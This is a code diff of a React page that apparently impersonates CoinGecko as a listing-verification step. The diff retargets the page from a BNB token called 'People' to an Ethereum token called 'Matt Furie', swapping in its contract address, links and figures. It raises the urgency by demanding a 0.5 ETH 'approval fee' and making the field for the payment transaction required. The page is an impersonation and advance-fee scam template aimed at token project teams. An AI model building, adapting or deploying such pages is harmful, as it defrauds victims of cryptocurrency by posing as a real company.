@@ -82,8 +82,8 @@ const submit = ()=>{
   Verify your project Details directly form the CoinGecko Database
 </p>
 <div className='uppercase flex gap-2 app items-center text-sm md:text-lg font-bold text-[#C0E48B] mt-10'>
-<img className='md:w-[2%] w-[7%] rounded-full' src="https://media.discordapp.net/attachments/974953912689893387/1262650085783769179/ppl.jpeg?ex=66975e07&is=66960c87&hm=4d13081d55da721b52c9f72b9470a34c7c96a9ed2e86880516584b49a86cc3b9&=&format=webp&width=640&height=640" alt="" />
-<p>PEOPLE</p>
+<img className='md:w-[2%] w-[7%] rounded-full' src="https://dd.dexscreener.com/ds-data/tokens/ethereum/0x652c0e3d583a43c6230eb2a8e9c9634e0ded7765.png?key=8c671e" alt="" />
+<p>Matt Furie</p>
 </div>
 
 <div className='p-2 app bg-[#000000] mt-2 md:mt-5'>
@@ -97,20 +97,20 @@ Database_file
 </p>
 <p className='mt-3 text-[#FD5370]'>project_data:[
   <div className='my-1 pl-2 text-[#b79761]'>
-  <p>"listing_id": <span className='text-[#CFADE8]'>"CL1507240051",</span></p>
+  <p>"listing_id": <span className='text-[#CFADE8]'>"CL1007240077",</span></p>
   <p>"type": <span className='text-[#CFADE8]'>"token",</span></p>
   <p className='mt-1 text-[#FD5370]'>"attributes": <span className='text-[#CFADE8]'>[
     <div className='text-[#b79761] py-1'>
-    <p>"name": <span className='text-[#CFADE8]'>"People",</span></p>
-    <p>"symbol": <span className='text-[#CFADE8]'>"PEOPLE",</span></p>
-    <p>"chain": <span className='text-[#CFADE8]'>"bnb",</span></p>
-    <p>"contract_address": <span className='text-[#CFADE8]'>"0xEa2F49A2e6E27b7B47cBEf50AFf5Af11350108D1",</span></p>
+    <p>"name": <span className='text-[#CFADE8]'>"Matt Furie",</span></p>
+    <p>"symbol": <span className='text-[#CFADE8]'>"FURIE",</span></p>
+    <p>"chain": <span className='text-[#CFADE8]'>"eth",</span></p>
+    <p>"contract_address": <span className='text-[#CFADE8]'>"0x652c0E3d583A43C6230eb2a8e9C9634e0deD7765",</span></p>
     <p>"decimals": <span className='text-[#CFADE8]'>"18",</span></p>
-    <p>"image_url": <span className='text-[#CFADE8]'>"https://storage.googleapis.com/coinsniper-assets/images/6oAcJxhQgSj4qc6p3v9LNDPhdzVjI93g6hVvv8yP.png",</span></p>
-    <p>"total_supply": <span className='text-[#CFADE8]'>"500000000000",</span></p>
-    <p>"liquidity": <span className='text-[#CFADE8]'>"252096",</span></p>
-    <p>"volume_24h": <span className='text-[#CFADE8]'>"340085",</span></p>
-    <p>"price_usd": <span className='text-[#CFADE8]'>"0.000004189",</span></p>
+    <p>"image_url": <span className='text-[#CFADE8]'>"",</span></p>
+    <p>"total_supply": <span className='text-[#CFADE8]'>"100,000,000",</span></p>
+    <p>"liquidity": <span className='text-[#CFADE8]'>"62,000",</span></p>
+    <p>"market_cap": <span className='text-[#CFADE8]'>"236,000",</span></p>
+    <p>"price_usd": <span className='text-[#CFADE8]'>"0.002494",</span></p>
     </div>
     ],</span></p>
 
@@ -121,21 +121,21 @@ Database_file
 <div className=' p-2 md:pt-2 pt-0 overflow-scroll app bg-[#000000] md:mt-2 lll'>
 <p className='text-[#FD5370]'>"description": <span className='text-[#CFADE8]'>[
   <div className='my-1 pl-2 text-[#b79761]'>
-  <p>"en": <span className='text-[#CFADE8]'>"People is a community-owned project on BSC.",</span></p>
+  <p>"en": <span className='text-[#CFADE8]'>"Furie, the amazing creator of Pepe, Andy, Brett and the rest of the Boys' Club! His creations have become crypto mega stars, and now, it's time for the father of them all to take the spotlight! This is Matt Furie, the Coin!",</span></p>
   <p>"de": <span className='text-[#CFADE8]'>"",</span></p>
   </div>
  ],</span>
   <p className='mt-1 text-[#FD5370]'>"links": <span className='text-[#CFADE8]'>[
     <div className='text-[#b79761] py-1'>
-    <p>"website": <span className='text-[#CFADE8]'>"https://peopletoken.xyz",</span></p>
-    <p>"whitepaper": <span className='text-[#CFADE8]'>"https://docs.peopletoken.xyz",</span></p>
-    <p>"blockchain_site": <span className='text-[#CFADE8]'>"https://bscscan.com/token/0xEa2F49A2e6E27b7B47cBEf50AFf5Af11350108D1",</span></p>
-    <p>"telegram_url": <span className='text-[#CFADE8]'>"https://t.me/peoplechx",</span></p>
-    <p>"twitter_url": <span className='text-[#CFADE8]'>"chttps://x.com/people0x",</span></p>
-    <p>"exchange_url": <span className='text-[#CFADE8]'>"https://pancakeswap.finance/swap?outputCurrency=0xEa2F49A2e6E27b7B47cBEf50AFf5Af11350108D1&inputCurrency=BNB",</span></p>
+    <p>"website": <span className='text-[#CFADE8]'>"https://mattfurie0x65.com/",</span></p>
+    <p>"whitepaper": <span className='text-[#CFADE8]'>"https://mattfurie0x65.com/whitepaper",</span></p>
+    <p>"blockchain_site": <span className='text-[#CFADE8]'>"https://etherscan.io/token/0x652c0E3d583A43C6230eb2a8e9C9634e0deD7765",</span></p>
+    <p>"telegram_url": <span className='text-[#CFADE8]'>"https://t.me/Matt_0x65FurieCTO",</span></p>
+    <p>"twitter_url": <span className='text-[#CFADE8]'>"https://x.com/MattFurie0x65",</span></p>
+    <p>"exchange_url": <span className='text-[#CFADE8]'>"https://app.uniswap.org/swap?outputCurrency=0x652c0E3d583A43C6230eb2a8e9C9634e0deD7765&chain=ethereum",</span></p>
    
     <p className='text-[#b79761]'>"geckoterminal_url": <span className='text-[#CFADE8]'>"https://www.geckoterminal.com/bsc/pools/0xfb2a1323445cd8a3e871f76147ca9828cb372cab",</span></p>
-    <p className='text-[#b79761]'>"listing_mode": <span className='text-[#CFADE8]'>"database",</span></p>
+    <p className='text-[#b79761]'>"listing_mode": <span className='text-[#CFADE8]'>"listing_approval",</span></p>
     </div>
       ],</span></p> ].</p>
       
@@ -151,7 +151,7 @@ Database_file
 <p>
 Please ensure that all details are accurately implemented to avoid additional charges for token updates by <a href="https://www.coingecko.com/" className='text-blue-500 underline'>CoinGecko</a>. Once verified, approve the publishing. It takes approximately 1-3 hours for the listing to be fully published on our official <a href="https://www.coingecko.com/" className='text-blue-500 underline'>CoinGecko</a> platform.
 </p>
-<p className='app mt-2'><span className='text-red-500 font-bold'>NOTE:</span> The Database listing fee cost 2 BNB, Endavour to send payment tx for fast verification and approval.</p>
+<p className='app mt-2'><span className='text-red-500 font-bold'>NOTE:</span> The Database listing Approval fee cost 0.5 Eth, Endavour to send payment tx for fast verification and approval., After approval project will be listed in 10-20 minutes.</p>
 </div>
 
 <div className='mt-3 app flex justify-between'>
@@ -257,7 +257,7 @@ Please ensure that all details are accurately implemented to avoid additional ch
    <p className='app text-sm'>
     Please provide us with the payment transaction tx, for fast track and proper verification of payment. 
    </p>
-   <input type="text" className='mt-2 p-2 app w-full outline-none border-black border-2'/>
+   <input type="text" required className='mt-2 p-2 app w-full outline-none border-black border-2'/>
           </DialogContentText>
         </DialogContent>
         <DialogActions>
